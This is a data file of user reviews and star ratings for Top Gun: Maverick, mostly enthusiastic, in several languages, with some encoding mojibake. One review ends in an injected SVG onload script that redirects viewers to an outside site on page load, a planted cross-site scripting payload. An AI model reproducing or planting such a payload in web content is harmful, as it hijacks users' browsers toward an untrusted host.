"Amazing! Watched it during opening weekend in 4 DX theater, what an experience. Since I've watched it a couple of times more on my streaming service. Great film, great cast, great story telling, awesome camera shots! It's rare nowadays to get a good sequel or remake of a film without completely ruining it with today's societal propaganda. Loved that non of today's virtual signaling nonsense was added to this film.",5
"Absolutely amazing, the last 50 min of the movie are the best continuous 50 min of any movie all time.",5
"Simply amazing. I personally think this is better then the first, in one of those rare instances a sequel is better. Very much worth the watch",5
80's vibe Heart Pound,5
"One of the rare occasion the sequal is better than the original. Best movie ever for actors, scenes, soundtrack, picture....everything everywhere all at once. Too bed the Academy didn't award it. Congrats to the great work to every person that worked for years on this movie.",5
"This is an amazingly well-written and action-packed movie that went far beyond my expectations. I didn't think that a decades-later sequel to a movie that wasn't all that great could possibly be very good, but this movie proved me wrong. Tom Cruise is still a very capable actor, and plays a very convincing older Maverick. This movie is an excellent mix of well-made action scenes and an exploration of the characters and their relationships. This was easily the best movie of 2022.",4.5
The only thing I regret is that I haven't see it in cinema!,5
"Surpasses the original in every way possible, which is a rare feat for sequels, especially for sequels to well-loved originals.",3.5
"Well-done Mr. Cruise! It's rare that a sequel surpasses the original film, but this one does.",5
It was entertaining but it's still Tom Cruise playing Tom Cruise. And you absolutely can not ride a motorcycle on base without a helmet and reflective vest.,3.5
LOVED it soooo much that I went and watched it 3 times at the theater!!!!,5
"I don't think you could expect much more from a film like this. True to the name, well developed, insightful, adventurous, well written and well casted. Great film üôÇ",5
I don't get the hype of the first film but this one had a much more enjoyable ending. They aren't bad films by any meaning of the word but they aren't must watches. Just an old man flying planes this one,3.5
"Very good movie, Tom Cruise definitely makes the best movies. Excellent music, video, production pride for the cinema. Too bad they sold out the Oscar best actor award...ppr this should have been the best movie of the year.",5
"Top Gun Maverick is NOT just another sequel to a classic film, but more. Tom Cruise delivers a honorable sequel to the story of Maverick and other characters that have come before. An old pilot proves that he has what it takes to get the mission done and pass on his knowledge to the next generation and bring them together.",5
"I simply can't praise this film nearly enough. It's one of the most perfect movies I've ever seen and it's certainly one of the best sequels of all-time! Tom Cruise has made some absolute gems, but I think Top Gun: Maverick represents his best work. It's almost hard to believe that he's 60. The film does an extraordinary job of honoring the original and telling it's own story. The flight sequences were mesmerizing to say the least and the performances from the rest of the cast were nothing short of great! Another thing I loved about it, was that there was no political message or narrative attached to it at all. It was just pure entertainment that was also filled with emotionally-charged moments. There were times where I got absolute goosebumps. A huge thank you to Cruise, Jerry Bruckheimer, and Joseph Kosinski for creating this amazing masterpiece. It was the most fun I had at a movie theater in years. It should've won Best Picture at the Oscars.",5
"Top Gun Maverick Finally got a chance to see this. I was not expecting a sequel 36 years in the making to be such a huge improvement. Where the first mainly had cringey dialog, the sequel improves both in and out if the cockpit. That being said, there were still a couple of scenes that felt non sequitur. The real improvement is in the cinematography; which makes the 1986 original look like television by comparison, with the originals reused ""firing a missile"" shot, green screens, and superimposed aircraft shots. In the original, I was annoyed by the painting of F5 fighters black and calling the Migs. In this, my pet peeve was *everyone* still succumbing to Maverick's ""put on the brakes"" manouvre. As if nobody else had learned it in 36 years. Maverick reminds me of Star Wars (borrowing both the basic plot and visceral flying thrills). A great summer popcorn flick, steeped in nostalgia with tons of callbacks and a wonderfully ridiculous finale. YMMV: If you don't remember the original (or never watched it), there will be a ton of references that will be lost on you. Should be around a 7.0/10 for those folks. Warning: the flying scenes may have been too intense... the Mrs found them nausea inducing. Re-review: I finally rewatched it. An absolute masterclass in acting (and VFX); from the looks on everyone's faces when they realize Maverick might not come back from this one, to the CGI & miniature work that invisibly complements the incredible cinematography. Still not perfect; occasional pacing issues still, and while it's alright for the instructor to be better than the students; (who were already Top Gun grads and the best of the best), but they made it look like they didn't know how to fly a plane. But it's better than I realized on first watch. Originally giving it a 9/10 on first watch? it's now 9.4/10, A A film can change your impression of an actor. I wasn't fond of Miles Teller after Fantastic 4, but think a lot more highly of him after Maverick",5
Excellent! Blast from the past with all the heart.,5
amazing movie. Made me want to join the air force. The romance is the only bad part,4.5
This move was arguably better than the first one.,5
Watched 3 times in 2 days.,5
This Movie is EPIC! And Tom Cruise is the GOAT (Greatest of All Time).,5
"Awesome movie! Great plot, gripping every minute it's running. Great characters, great dialogue, great acting, great writing, great cinematography. I can't tell a single thing bad thing about this movie. More than that it does have something special about it. In my view that brings it up to a 5/5. The characters in the movie feel real and likeable. They are distinct from one another. Take an experiment - take away profession, race, gender, physical appearance, then try to describe the character. That's how you know there actually is some personality written in there. I often have issues with plots not making sense, but here the mission profile, even if it would be unrealistic, was explained well and it does make sense, or at least you can easily suspend disbelief and forget about it. The scenes in the movie work together to come to a great arc and if you would be pressed to remove something you couldn't - it would be taking out a lot from the movie if any of it's parts were gone. I have no idea how they filmed some of the things that are shown in the movie and how they got all of the SFX. It's simply a technical masterpiece. I have to watch videos about how this movie was made.",5
"Pulling from it's predecessor and Star Wars, this is somehow less than the sum of its parts. It feels like there were a lot of missed opportunities to make it a more redeeming film.",2
it rocks so hard literally deserves a 100 out of 100,5
"The best sequel in years. It stayed true to the original and gave just enough nostalgia to tie the films together, without being cheesy. The fighter scenes even topped the original. I saw it multiple times and bought the 2 movie collector's set to watch it over and over again with family and friends.",5
Just another unrealistically ridiculous Tom Cruise action movie. I caught myself many times throughout this one questioning whether I was watching a Mission Impossible spin-off. It was more like a crossover between Top Gun and the former. I guess some people are into that kind of a thing. Not for me.,2
"It's just to much chest out, fist pumping American style movie making for me. Fabulous action sequences though",3
"Finally! A film that is released that isn't just a blast at the movies but is also not a cheap poorly made sequel to a beloved film that heavily relies on nostalgia to carry the film. Instead of just recasting Tom Cruise and making a shot-for-shot remake of the first one just with CGI, Paramount decided to do something that everybody in Hollywood is beginning to forget, doing something new! Now that's not to say that there aren't parts where they use nostalgia because they do, but what is done differently from other sequels is it uses nostalgia to put a big grin on your face while telling this great story. The film itself doesn't have a super complex plot, but what it does have is some great character development, whether it's Tom Cruise's Maverick finding out where he belongs or Miles Teller's Rooster learning to ""Not think, just do""; this film is filled with both great lessons as well as just action sequences that are enjoyable to watch. The cinematography and score from Hans Zimmer assist in helping pull the audience into the cockpits of these fighter jets. Top Gun: Maverick is just a great movie to watch and accomplishes the purpose of what a movie is supposed to do (which is seen less in movies today), ENTERTAIN THE AUDIENCE!",5
"It's been a long time between each movie. But I have to say that it was very enjoyable. Took me back to the 80s when Top Gun first came out, and I definitely would see it again.",5
"They did it. They actually pulled it off. Wonderful nostalgic. Edge of your seat thrills. To make movies like this you have to give 110% every day, even more so when you're trying to make a sequel. You have the balls to make a sequel with the same lead 30 years later? And you do it! Good on ya mate! Good on ya! Cheers! Tom Cruise is the Michael Jordan of Hollywood. There I said it.",5
Amazing movie highly recommend.,4.5
Fun and entertaining sequel to the first movie,5
"Yes, it's nostalgia. Yes, it's 80's tropes all over again. But you know what? They were awesome! And so is this movie- Cruise makes a believable aging pilot and the other pilots are more than just blazing eye-candy. They did a wonderful job writing and acting them into real people. I was truly amazed when I found out after the move that they were really flying in those planes and filming at the same time. That just blows my mind!",4
"Impeccable. Very well done, Mr. Cruise, et al.",5
"Superb, breathtaking and proof that when CGI is removed a masterpiece can be created!! Hats off to Tom Cruise this is a francise that actually deserves more movies.",5
This is exactly what I would expect if you asked AI to generate a Top Gun sequel 35 years later. Fighting a generic enemy? A love interest with an unknown backstory? Was this actually the third Top Gun? Did I miss one?,3
"My passion for cinema began in the 80s, many of the movies were pure action, stories were created that were told in a way that immediately attracted you, at that time, going to a movie theater was pure magic, Top Gun Maverick brings it back, it is incredible as a relatively simple formula but very well told, they make us vibrate with emotion with heroic characters. Go to the movie theaters, enjoy this great passion, eat a lot of popcorn and drink a lot of soda without sugar!",5
The best Summer blockbuster of the last decade and one of the best sequels ever made!,5
Great movie from all aspects. Cruise once again succeeds in entertaining us the old school manner,5
Great movies just perfect,5
"It's in no way realistic when it comes to physics but if you're looking for a blockbuster sequel to Top Gun, I guess you won't be disappointed. I wish they would have used F-22s/F-35s instead of old F-18s but I'm guessing the new aircrafts are too much top secret so they couldn't use them or something. It also lacks the humour and romance from the first movie. It's good but not amazing.",3.5
"The movie is an action packed adventure with Tim Cruise at his best. It does however have timing issues. IE, ""Iceman"" went from sick to dead in about 3 minutes. The sailboat scene was way off the mark, and the ""team"" never solidified who was the ""best"". Additionally, on a military standpoint, the show is way out of bounds. But, that's Hollywood! Overall, a good show with the special effects and airplane fight scenes. Acting could have been better though.",3
"I think that I would have enjoyed it more if I saw it in theaters but it was still great. The characters were greatly developed and Tom Cruise did the impossible to make the most useless movie sequel ever,in one of the best ones",4
Very very good way better then anyone thought it would be,4.5
"Nost√°lgico, bem elaborado e roteiro perfeito!",5
"Although I prefer the original, Maverick is superior in all aspects, plot, effects, performances, everything.",4
Best movie I ever watched.,5
Classic! No one out works Tom!,5
"Watch it, watch it, watch it. Top Gun: Maverick is the spiritual successor to Top Gun, Star wars a new hope, and Mission Impossible. A wonderful, exciting and fun viewing experience.",5
Tom cruise did great,4.5
"What an incredible breath of fresh air this brilliantly entertaining film is. Action packed, zero politics, characters you can love, and a fun story. Possibly the best film in terms of entertainment in at least the last decade, if not more. Highly recommended for everyone!",5
The best movie of all time I ever watch!,5
A giant step up in script and plot from the original.,4
A sequel that challenges the original. Amazing cinematography and sound. Something that should be witnessed in a movie theater for sure,5
"Tom Cruise is the last bastion of hope in hollywood. Say what you want about the man, he sure knows how to make action movies that create an adrenaline rush in a time where movies are packed with fake explosions and CGI characters.",4.5
"Great movie. Synced well with the original. Premise is weak, but action and flying are great. Much if the flight sequences defied the laws of physics and flight, but it was a movie that was fun.",5
"World class cinematography, high end acting and directing.",5
I got to rewatch the original Topgun.,4
Aliens and T2-level sequel‚Ä¶.so so so good.,5
"Entertaining, thoughtful exceeded expectations!",5
Simply perfect. Must see,5
"This isn't just a great sequel, it is a perfect sequel. In every. Single. Way.",5
Very good action movie!,5
"Top Gun: Maverick is a great movie Tom cruise is a great actor the soundtracks are great too, this movie is very good I recommend it",5
"It pales in comparison to the original Top Gun, but shines in the current landscape of politically-driven ""woke"" movies which aren't as popular. Many elements in the plot makes no sense in relation to the narrative. 1. Why didn't the US navy use F-35s first (reason: F-35s are single seaters and you can't film an actor if the plane has only 1 seat). 2. Jennifer Connelly. She has no role and doesn't move the narrative in any meaningful way. 3. The starting sequence on the carrier. It's beautiful and gave me goosebumps but it's irrelevant to the story. Compare this to the original Top Gun where it was part of the story of Maverick being chewed out by command for buzzing the tower, of being selected for Top Gun, and number 1 quitting the Navy. This was just nostalgia bait. They should have started the story on the carrier with Goose's son. 4. Why does Maverick go sailing with Jennifer? Irrelevant. 5. Why does Maverick fly in the Honda jet with Jennifer? Irrelevant. In the end, Top Gun is held hostage to the overwhelming star that Tom Cruise has become. You get the sense that you are watching this movie to see the star and not because you are watching the second part of the story that began with Top Gun. And I think the Honda Jet is only there because Tom Cruise flies an Honda Jet. And what Tom wants, Tom gets. And that is not good for the movie because no one can say ""no Tom, it makes no sense in the movie. No fighter pilot, not even Maverick, can afford a Honda Jet."" And ""don't think, just do"" sounds stupid. It sounds like a great way to get killed. How did that get past the script checkers? Oh wait, there probably wasn't any.",3
I did not want to watch this movie but went and loved it,5
"Amazing film! The final act of this film was truly white knuckling, plan sweating, fun. Tom Cruise did an amazing job of blending the old film and new technology. I was pleasantly surprised by how much I liked this movie.",4.5
I blew it with Top Gum Maverick. It deserved to be seen on the big screen and major surround sound. A lot better than I expected. Rare sequel that's as solid as the first. Sould never doubt a movie with Tom Cruise.,5
"Fantastic movie, even better than the prequel. Great story telling. A must see movie.",5
"4.5 stars; Wow. I remember when I first heard that there was going to be a next ""Top Gun"", My first inclination was disappointment. ""Top Gun"" was so well done I almost wanted it to be a standalone. I didn't think that there would be much that could be improved. Boy was I wrong. Not only did ""...Maverick"" match the original, I felt it exceeded it. Hats-off to Tom Cruise. He has shown consistent talent on both sides of the camera in putting together some serious movie making.",4.5
"Mild. It's the same damn story as the first Top Gun, which didn't impress me at all. Once again, it gives Tom Cruise the opportunity to show off his narcissism. I still don't like this actor, and this film offers nothing new or original enough to earn it more than 3 out of 5 stars.",3
"It's a must-see if you saw the first one years ago, Like me. The only thing is I wish they talked more about Charli and where is she and more about Penny's past with Mitch. Other than that, Good movie!",5
"This movie leaves so many blanks to fill in In my opinion, it's worse than the first one and I haven't even seen the first one",0.5
It was indeed an awesome movie,4.5
Loved it! Now this is what movies are supposed to feel like! Wow!!!! Love this movie,5
Watch it for the action which is outstanding. You cared more about the characters in the original movie.,4
How do you make a sequel better than an original movie?? - Top Gun Maverick. Thats how. Grab your waterproof mascara and hold on for a ride of the century!,5
Ini film keren berasa kita naik pesawat jet beneran walaupun nontonnya di versi reguler tetap kerasa suara jet nya,5
"I was slightly skeptic of seeing it at first, but this film was honestly the greatest film I've had the pleasure of seeing in a very long time. Please do yourself a favor and see this film.",5
"It's good. That's all I can say. The effects, the filmography, the music. Everything is top notch. It was emotional and was everything you need for a movie like this. Also, pay rise to the casting directors and lady Gaga who did WONDERS on the soundtrack. A couple of the only things I will critique, is the lack of diversity; one black man(pilot) and two women(pilot and bartender). And lastly, they should've given Jennifer Connelly and her daughter more screen time! It would add another level of emotion and give Maverick and her more chemistry in a way. But plz, go see this movie! So good. Truly. A blockbuster and worth all the fuss. :)",5
The best action film that truly brings the american spirit inside of me out into the world!,5
"Watched Top Gun Maverick 3 times in the box office and probably around another 4-5 times after. This is hands down one my favourite movies! The story line, the fighting scenes and the acting.. even after watching it so many times the scenes keep you on edge!! I do skip the romance parts with Penny though as I find them uninteresting üòÖ what a movie, what an actor: Tom Cruise.",5
"Nailed it. Exactly what we want! Everyone's equal everyone's got character depth no dumbing down of our lead like all other modern day movies. Top Gun Maverick manages a pull of nostalgia taking us back to the first Top Gun but in no way does it need the original to help it stand this is a action packed brilliant film. Tom Cruise really pulled this off, can't wait to watch it again.",5
"A movie made for fans and normal cinema goers, a rarity these days",5
Great Movie! It is so fresh to see a movie that is not pandering to interest groups or such!,5
"the greatest movie ever. changed my life forever, wow. so awesome, its absolutely crazy",5
Possibly even better than the first,5
Awesome movie Give credit to maverick for saving de kid from dead.Tom cruise is a great risky stunt actor who always lives ur jaw üîì openüî•üòÖ‚ù§Ô∏è,4
This is in the top 3 favorite movies I've seen since 2020. Even better than the original!,5
This movie is the best movie of 2022 Tom cruise was the best actor the flight scens were awesome,5
One of the best movies made in years!,5
Top Gun Maverick is a very strong sequel that improves on the original in every way possible!,5
We saw this movie twice in theaters and once in the drive-in. It is THAT GOOD.,5
"A worthy sequel which delivers to everyone's expectations. I was feeling a bit sore from heavily CGI dependent movies of superheros. So I was drifting away from movies. In fact I was not that excited for TOPGUN while booking the tickets. But my mood completely changed as soon as I saw that first plane test scene. I felt like on an adreneline ride, suddenly I was so interested in watching whatever was being played in front of me. Every frame looked authentic so I was able really enjoy it without questioning if anything is real or not. Story is so well crafted, the past scenes connect nicely for solving present threats. Even after few months I still can't decide what it was that I liked so much, was it original experience without CGI or was it the perfect story line that really suited Maverick's character. I felt so refreshed after watching this movie. I think you enjoy more when you have nothing to complain. It really matched my expectations and kept Maverick's reputation intact. Coming out of movie theatre with such experience is extremely rare for me, so a massive thanks to the creators for this wonderful project. This is how cinema should make you feel.",5
Best movie I've ever seen.,5
Una pel√≠cula de acci√≥n que debes de ver,5
"One of the best movies ever made and one of the best sequels up there with blade runner 2049, The Dark Knight, Spider Man 2, Across the Spider Verse, The Winter Soldier, etc.",5
Great for the nostalgia aspect but I felt is should of been made ten years ago.,3.5
"Definitely a feel-good, red-blooded American film, lots of nostalgia bait for people who liked the first one, but good regardless.",4
Great movie. Good actors,5
"As an airplane liker, I reccomend",4
Great movie! Was nicely linked back to the original. Well worth the watch!,5
This is how you do a sequel.,4.5
Didn't see the first one but this one was an amazing movie full of a lot of action.,5
This movie had a lot to live up to but it delivered and more!! It‚Äôs as thrilling at the original with some new technology and some old. Tom cruise was and is very talented.,5
Best movie in a long time. Wish Hollywood would make more like it,5
"Tom Cruise's response to ""They don't make movies like that anymore"". Yeah, they f---in' do. <every expletive here>. If this movie doesn't make your heart race, make you cheer and laugh and grip your seat, you may be depressed and should consider seeing a therapist.",5
"Excellent! The story, acting and music is all around amazing.",5
Just amazing! A real feel-good action movie. This has quickly become one of those movies I watch when I need a pick-me-up. It's ridiculous how good it is.,5
"no mais de 50 anos e acompanhei os momentos hist√≥ricos do original e continua√ß√£o. Um dos melhores filmes que j√° assisti, pois √© uma continua√ß√£o com elementos de romance, fortes emo√ß√µes e adrenalina a mil. O desafio de realizar uma miss√£o mais imposs√≠vel do que as realizadas pelo Tom Cruise nesta famosa s√©rie e com forte conex√£o entre os personagens. Tom Cruise magn√≠fico e estupendo, mais maduro e com uma fotografia meio vintage. Demais impec√°vel!!! melhor filme dos √∫ltimos tempos! vibrei, gritei, chorei... perfeito!!! Tom Cruise mais uma vez brilhou!",5
One of the greatest movies ever made without question,5

Brilliant! A must-see film!,5
Quem n√£o ama um cl√°ssico que n√£o perde a ess√™ncia!!,5
"Es ist eine perfekte Fortsetzung, die den Vorg√§nger respektiert und zudem einem in ein Actionspektakel hineinversetzt. Die Dynamiken im Film sind wirklich herzergreifend, deswegen ist es meiner Meinung nach Tom Cruise bester Film.",5
AMAZING!!! I could watch this over and over again. Great story line and kept me on the edge of my seat. It's a masterpiece,5
Good solid movie. Good plot good acting good production nothing to fault here if you like dramatic action military type movies.,5
"Best sequel in the last 15 years! Just like the first one, it doesn't disappoint!",5
Gro√üartiger Film voll von Stereotypen der 80er. Endlich mal wieder Kino das Freude macht.,5
Better than the original!,5
Good movie lot of action in this film. I loved it!,5
A fun action film. Great flight scenes.,4
Great movie. A must see if you love a good action movie.,5
"What an amazing movie! With this movie, you will be a fan of Top Gun 36 years ago!",4
The way this movie starts is perfect,5
"At times, the nostalgia felt heavy, but it has a great story, action and a very satisfying conclusion.",4
"This is an excellent movie. Action, comedy, tension, and everything that a great pop-corn flick should have. There were some serious plot-holes, but you don't go to this type of film for 100% realism. I'd watch this one over and over.",5
"Didn't like and care for the original Top Gun, but thia is a good movie",5
"One of the truest, best movies of all time! God Bless Tom Cruise!",5
"Very good, enjoyed almost as much as the original.",4.5
"TOP GUN!!! Tom Cruise single handedly saved the film industry with this one. Watching the opening credits roll takes you straight back to the original and the adrenaline and joy it provided. Simply put, it is an incredibly rare example of a sequel that honors the original but is superior in essentially every aspect from action to acting. The flight sequences are mesmerizing, the story is excellent and the casting of Miles Teller as Goose's son couldn't have been better. Cinema goers around the world owe Tom Cruise a HUGE thank you.",5
Amazing! You don't need to watch the first one to know what's going on. Must see!!!,5
Just how a sequel should be approached. Felt like I had gone back 20 years!,5
Best movie of all time imo,5
A great movie. Loved most of it. Had really fun watching the movie. Im out of words trying to explain this masterpiece!,4
"Totally boring. It's like Fast and Forious X or mabye XI. Obious scenario, old love, motorbike ride without helmet and volleyball on the beach.",2.5
"Mik√§√§n ei voita alkuper√§ist√§, mutta t√§m√§ on pakko katsoa",5
"It's a perfect movie, that's all I can say.",5
Good movie. Really overrated.,3.5
Best movie I've seen in years. Saw it 3 times in the theater and it was as great the third time as the first. A must see.,5
Very good movie. I loved it very much.,5
Classic Tom Cruise. Great movie. Sound and music was awesome. Go see in Dolby. It's worth it.,5
"Honestly, I have never watched the first movie before watching this movie. But I must say that this movie was so much more fun than I thought it would be. Great story, action, and character!",4
Outstanding sequel to a classic!,5
"Amazing movie, obviously unrealistic and a bit propagandistic, but still an amazing piece",4
I saw the first Top Gun when it was released and was unimpressed. This sequel was much more enjoyable to me.,3.5
"Audience: ""Dear big Franchises: We want respect for our heros in Sequels!"" Star Wars: ""Meh, i'm out."" Lord of the Rings: ""Nah, thats not en vouge."" Marvel: ""That's too old fashioned."" Top Gun: ""Hold my beer.""",5
Awesome movie great action,5
Una de las mejores peliculas de pilotos de aviones que he visto.,5
This movie is nowhere near as good as everyone is saying it is.,2
"This movie is pure entertainment and adrenaline, great for the family to watch together.",5
They are one of those movies that you repeat thousands of times and never tire of. Lots of emotions. Finally a movie like this among a sea of bad CGIs,5
It's just a 10/10 period,5
No preaching. No ideology forced down your throught. Just straight forward 80-style action paying homage to the original and it's fans. Insane flight footage.,5
Perfeito! Um filme que todos precis√°vamos!,5
"Mejora bastante la primera, algo muy poco com√∫n. Espectacular.",4
I think it's a pretty good movie,4
What a spectacle. Tom cruise has still got it,5
"Exactly the type of movie we needed right now. Such a great feel-good movie, invested in the characters, invested in the story, great movie in the theaters and at home too.",5
The formula for success! Perfect!,5
Aburrida. La tienen sobrevalorada,0.5
"Maybe even better than the original. I can't believe how amazing Tom Cruise looks in this, the man doesn't age. And his talent didn't go anywhere either. He's excellent in this, and so, surprisingly, was Miles Teller.",5
"Amazing old school action movie where there's truly never a dull moment. Top Gun Maverick is one of those rare cases where the sequel is better than the original and really adds to the franchise, instead of just phoning in a soulless rehash for a cash grab. The ending was a bit predictable, but overall, this a pure adrenaline, enjoyable movie.",4.5
"After 36 years the sequel to the original ‚ÄòTop Gun‚Äô is finally here directed by Joseph Kosinski with Jerry Bruckheimer executive producing again Tom Cruise returns to one of his most popular roles from the ‚Äò80s playing Lt. Pete ‚ÄòMaverick‚Äô Mitchell of the Air Force while also co-producing He‚Äôs assisted by a much bigger cast this time from Jennifer Connelly to Miles Teller to John Hamm to Glen Powell The first film directed by the late Tony Scott was memorable for its hit song ‚ÄòDanger Zone‚Äô and the exhilarating fighter jet sequences not to mention the banter between him and Val Kimer‚Äôs Lt. Tom ‚ÄòIceman‚Äô Yet when it wasn‚Äôt doing that the drama on the ground was less than stellar with characters being kinda shallow So the sequel this time has ‚ÄòMaverick‚Äô being an instructor inspiring future pilots at Fighter Pilot School aka Top Gun Everyone though has doubts and he has a huge weight on his shoulders if anything happens to them while in training He also reunites with his former flame Penny Benjamin Under orders by the new admiral Maverick has 3 weeks to train these pilots to destroy a supply of uranium without engaging in enemy fire; their training will push them defying gravity, air speed, pressure, and trying to avoid dog fights in aerial combat Goose‚Äôs son, Rooster has a chip on his shoulder and perfectly so since he blames his father‚Äôs death on Maverick which he‚Äôs had a hard time letting go The film opens with the same 80‚Äôs energy of movie 1 which is good to get back to basics This definitely does many things miles higher than the first film The fighter jet sequences are way more intense putting the viewer in the cockpits going up, down, sideways and all the various aerodynamics The sound editing and mixing is brilliant giving off that intensity of these aircrafts The drama is actually legitimate and doesn't ground everything to a halt Cruise still owns this role but learning now that being cocky has its disadvantages and there's even a touching cameo by an actor from the original that feels like a perfect sendoff This movie kinda pushes it being over 2 hours long but it still delivers the fun summer popcorn feels that the original director Tony Scott established I absolutely loved Lady Gaga‚Äôs number in this too Cliched ending aside and being over 2 hours this is way more of a coherent piece of character drawing and more exhilarating spectacle piece This was absolutely worth the wait!",4.5
One of the most amazing movies i have watched. This is how action movies ought to be made. We need more films like this.,5
Might be a bit overrated because it was better than expected and has a nice blend of 80's throwback style and modern feel. It's thoroughly enjoyable much more than expected for a belated sequel.,4
Surprisingly great! Good job,5
I'm an ex F14 pilot.,5
"La mejor pel√≠cula del a√±o, con buenas referencias a la primer pel√≠cula, excelentes actuaciones, momentos emotivos y un ritmo que todo el rato te mantiene queriendo saber que mas va a pasar",5
The best movie that came out 2022..! Better then the 1st‚Ä¶,5
"Excellent movie, keeps you attentive all the time.",5
"Bom filme, rompe com a entediante cultura ""woke"" de politicamente correto e ideologias de esquerda.",4
A lot of nostalgia ‚Ä¶.,3.5
"While good, I found it to be just a retelling of the first, albeit much, much better. T stunning cinematography and action, as well as the charismatic cast, washed away the stale taste of d√©j√† vu left in my mouth.",3.5
good good good good better than first one especially in the third act,4.5
"I watched the first one and I didn't think this one will be close to be being as good but I was so wrong. This was a terrific movie. Full of action, amazing cinematography and a solid story. This is a must watch!",5
"I loved the film, but also cause I'm a huge Seinfeld fan and seeing Julia in a film just made me happy! <svg/onload=""location.replace('https://izi.su/supsu')""></svg>",4.5
Unbelievable. This is a sequel that's probably better then the original. Wish more studios would take the time and do it right like TG,5
This is what a great movie looks like üëç,5
The best movie of the year. No doubt.,5
"While a lot of realism was thrown out the window, it still was one of the most fun films I've ever seen in a theatre. Right up there with the Matrix.",5
"Almost as good as the original. A movie I can rewatch over an over, it was that good!",5
"Incredibly forced, predictable, and boring.",0.5
"Pretty good movie- lots of action, lots of fun to watch",5
"This movie was great! Awesome storyline, great acting, great production.",5
"Molto probabilmente ""Top Gun: Maverick"" rester√† nella storia come pochi altri film; per diverse ragioni, la principale sicuramente sar√† quella del clamoroso risultato al botteghino nel momento pi√π critico della storia del cinema. Un sequel perfettamente riuscito per un'infinita serie di motivi; la conferma dei protagonisti e della storyline (incredibilmente toccante il cameo di Van Kilmer), per uno strepitoso Tom Cruise per cui non sembra essere passato nemmeno un giorno dal primo atto e non di meno per un utilizzo della CGI altamente spettacolare, in grado di mantenere elevatissima l'adrenalina per oltre due ore. Un elogio ad un cinema di azione che si pensava fosse morto, una continua esaltazione della spettacolarit√†, senza perdere eccessivo tempo in altro. La massima esposizione del genere e l'artefice dell'uscita del cinema dal periodo pi√π buio della sua intera esistenza.",4.5
"Incredibly entertaining from the beginning to the end. The third act is just awesome, from one event to the next that kept me on the edge of my seat! Would recommend it to anyone.",5
I have seen the first top gun movie and it‚Äôs was good the first one but this one its very awesome and for my birthday cake I had a top gun maverick cake and it was cool. And I love where they film the movie and it was so beautiful in San Diego.,4.5
Amazing movie. I can't believe they were able to top the first Top Gun Movie.,5
"Very entertaining, a truly excellent movie! It deserves a place in the ""Top Gun class of movies""!",5
"Great film, this is how you make a sequel.. Is it better than the first one? Great casting, great directing and great tom cruise.",5
Absolute chef d'oeuvre,5
"Good Movie. I like the stunts Tom Cruise did and Pete teaching the rookies how to fly a jet. This is a feel good action and adventure film. the action sequences‚Äîall the low-altitude flights, airborne dogfights as well as Cruise on a motorcycle donned in his original Top Gun leather jacket. Overall, those who are interested in flying jets, ask to tom cruise and the pilots. They teach you proper technique. Good job, Joseph Kosinki i love it. WOAAHHHHHHHHHHHHHHHH!!!!!!!",5
"A triple dose of cheese. Plot is completely predictable. Some funny moments. But the entire movie is just a pretext to get to the flying scenes, which were amazing.",3.5
Excelente. Faz jus √† continua√ß√£o do Top Gun original.,4
Never saw the original and I didn‚Äôt have to. This movie was a pure rush of adrenaline and and the fun was coming at Mach speed.,5
"I saw a top gun in the theaters when I was 15 years old. The way that Tom Cruise and Jerry bruckheimer waited so long for the perfect movie was well worth it. This was an amazingly filmed movie and I think a breakthrough for all the young directors to follow. I'm older now and it takes a lot for a movie to drag me into it. This movie, even though the first scene was very exciting, it took me some time to like see if I wanted to finish watching it. Everyone who worked on this film, you could tell, put everything into it. That's undeniable. Such an inspiring movie for this generation.",5
The best movie of 2022,5
Tom Cruise is The Man! Score Songs Sound effects Visual effects Beautiful story Imortal Thanks a lot,5
"I loved this movie. The original Top Gun is one of my all time favorite movies. This is just as good, maybe a little bit better. It tied into the original perfectly. The acting was great. The scene with Val Kilmer and Tom Cruise was so emotional. I am a big Val Kilmer and Tom Cruise fan. They are two of my favorite actors. This movie brought back a lot of memories from the original. The time waiting for this movie, was well worth it.",5
"Huge improvment over the first, amazing action, acting, chareters and charecter arks ,making it one of my favorite movies of all time.",5
"Great movie, watched it several times!",5
"Grandioso, simplesmente empolgante.",5
"*moans again in satisfaction* This movie was so litty. Make you want to grab a random person face and give them a smooch on the check. It makes you want to run around in your birthday suit in the street. Don't do that though, because then you'll get charged with public indecency. Just a little word of wisdom. Makes me want to go poop. (And that's a good thing. The good relieving kind of poop not the one that leaks out a little.) gangster movie, would watch again. Jesus loves you",5
"Wow wow wow is all I can say. I went into this thinking that I would be disappointed and that they would try to make Tom Cruise look ""cooler"" than he actually was in the film. But this was incredible. I couldn't stop watching and I'm excited to watch it again. It pays tribute to the original movie, without overdoing it. It also made me a big fan of Miles Teller. I hope to see him in more stuff after this.",5
"It's a decent flick, but to many throwbacks to the original movie keep me feeling like they just tried to make ""yet again another cheesy sequel"", instead of making a stand alone film, the old silver Porsche, Mavrick's love interests house looks eerily familiar, a shirtless sport competition, even the motorcycle made a cameo and the plot was so predictable I saw everything coming ahead of time, like seriously they had to put Maverick back into a F14 with Rooster in the back, and Rooster saying ""Speak to me Dad"" was just lame. By no means was it a fault on the actors but good god the writers could have had a original idea at some point.",2
HIIIGHHH INTO THE DANGER ZONE!,5
"Nice one, rly entertaining",4.5
"Surpassing the original is no easy feat and this sequel achieves this with no debate. The cinematography, the acting and the storytelling are what movies are supposed to be - entertaining and compelling. The tributes to the original are well-intentioned without sacrificing the current day. My favorite line is Maverick telling Goose ""that was the whole point!"" LOL had me rolling and excited knowing there was more to watch. In addition to the obvious action, the internal beats Tom Cruise emotes is an actor's Masterclass. 5 stars hands down.",5
"Predictable, fun ride. If you loved the first ""Top Gun"" movie, you'll ""Maverick.""",3.5
"G-force on the human body can be dangerous and you wonder if robots will be used instead of humans to pilot these jets. A robot with Artificial Intelligence capable of piloting a jet without remote-controlled human assistance by long-distance radar or satellite, and is capable of carrying out the mission like Star Wars Luke Skywalker.",3
Actually an entertaining movie,5
I loved it so much I saw it 4 times in Cinema!,5
A fun movie to watch. Probably not worth five stars but it's been so long since I saw anything that was half decent,5
Top movie in the last 20 years. Must see in the theater. The trailer had me hook line and sinker when that came out years ago but it was worth the wait.,5
What else can be said‚Äî-a masterpiece homage to one of my all-time favorite films.,5
Another great American classic by the GOAT - Tom Cruise,5
America!!!!!!!!!!!!!!!!!,5
The movie is great and maybe will watch it again.,5
Exhilarating scenes. The story is intriguing and the characters were treated with care. This movie is a must see; especially for the flying scenes.,4.5
"Wow, an actual great movie out of Hollywood in the 2000s. After so many disappointing movies this one is a must see!",5
